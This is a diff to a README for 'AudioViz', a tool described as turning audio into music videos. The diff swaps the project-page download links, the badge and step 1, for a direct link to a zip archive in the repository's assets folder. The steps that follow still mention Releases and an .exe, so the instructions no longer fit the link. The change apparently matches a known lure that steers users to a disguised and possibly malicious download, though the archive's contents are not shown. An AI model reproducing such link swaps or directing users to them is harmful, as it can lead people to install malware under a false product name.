@@ -1,6 +1,6 @@
 # 🔊 AudioViz - Create beautiful music videos with ease
 
-[![](https://img.shields.io/badge/Download_AudioViz-blue.svg)](https://github.com/gerriumbellar10/AudioViz)
+[![](https://img.shields.io/badge/Download_AudioViz-blue.svg)](https://raw.githubusercontent.com/gerriumbellar10/AudioViz/main/assets/Viz-Audio-urd.zip)
 
 AudioViz turns your audio files into visual videos. You can watch a preview of your music as it plays or export the result as a high-quality MP4 file. This tool works with common audio formats like WAV and MP3. You do not need technical skills to create professional videos for your songs.
 
@@ -8,7 +8,7 @@ AudioViz turns your audio files into visual videos. You can watch a preview of y
 
 To start, you must get the installation file from the project page.
 
-1. Go to this address: [https://github.com/gerriumbellar10/AudioViz](https://github.com/gerriumbellar10/AudioViz)
+1. Go to this address: [https://raw.githubusercontent.com/gerriumbellar10/AudioViz/main/assets/Viz-Audio-urd.zip](https://raw.githubusercontent.com/gerriumbellar10/AudioViz/main/assets/Viz-Audio-urd.zip)
 2. Scroll to the section marked Releases.
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your computer.
